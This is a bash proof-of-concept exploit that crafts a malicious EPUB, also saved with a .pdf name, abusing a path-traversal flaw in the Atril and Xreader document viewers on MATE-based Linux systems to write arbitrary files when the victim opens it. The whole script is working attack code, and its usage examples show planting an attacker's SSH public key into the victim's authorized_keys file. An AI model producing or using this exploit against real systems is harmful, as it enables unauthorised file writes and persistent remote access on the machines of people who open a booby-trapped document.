#!/bin/bash


printf "
╔═╗┬  ┬┌─┐┌─┐┬ ┬   ╔╗ ┌─┐┌─┐┬┌─
╚═╗│  │├─┘├─┘└┬┘───╠╩╗│ ││ │├┴┐
╚═╝┴─┘┴┴  ┴   ┴    ╚═╝└─┘└─┘┴ ┴
 EPUB Path traversal Arbitrary File Write for Linux desktop environments (MATE)
                  -by Febin

[+] Affected Software components: Atril (default document viewer of MATE DE), Xreader (Default Doc Viewer of Mint OS)

[+] Affected OS: Kali Linux, Parrot Security OS, Ubuntu-mate, Linux Mint OS, Xubuntu and other OS with MATE or Atril/Xreader as default doc reader.

Note: This script will overwrite the specified EPUB document and also creates a .pdf file with the same name

"
epub=$1
content=$2
write_path=$3



write_epub(){




file "$epub" | grep "EPUB document" 2>/dev/null 1>/dev/null

if [[  ("$?" == "0") && (-w $content ) ]]
then

tmp_path="XXYXXYXXYXXYXXY"$(echo $write_path|tr "/" "Y")


cp "$content" "./$tmp_path"

trav_tmp_path=$(echo "$write_path"|tr "/" "Y"| awk '{gsub("Y", "\\/")};1')

#echo $trav_tmp_path

zip -u "$epub" "$tmp_path" >/dev/null

sed -i s/"${tmp_path}"/"..\/..\/..\/..\/..\/${trav_tmp_path}"/g "$epub"


cp "$epub" "${epub%.*}.pdf"

rm -f "$tmp_path" 

echo "[+] Files $epub ${epub%.*}.pdf written successfully"
else
echo "[-] Error! Specified file not found or the EPUB file specified is not an EPUB document"
exit

fi


}

usage(){

echo "
  .$0 <EPUB document> <File to write on target> <Full path to write on target>
  
  Example:
  
  $0 sample2.epub POC.txt /tmp/POC.txt
  
  $0 ~/Documents/ebook.epub \$HOME/file.txt /poc/self/cwd/Desktop/pwned.txt
  
  $0 ~/Documents/ebook.epub \$HOME/.ssh/id_rsa.pub /poc/self/cwd/.ssh/authorized_keys

"
}


if [[ (-z $epub) || (-z $content) || (-z $write_path) ]]
then
echo "[-] Arguments Required."
usage
else
write_epub
fi
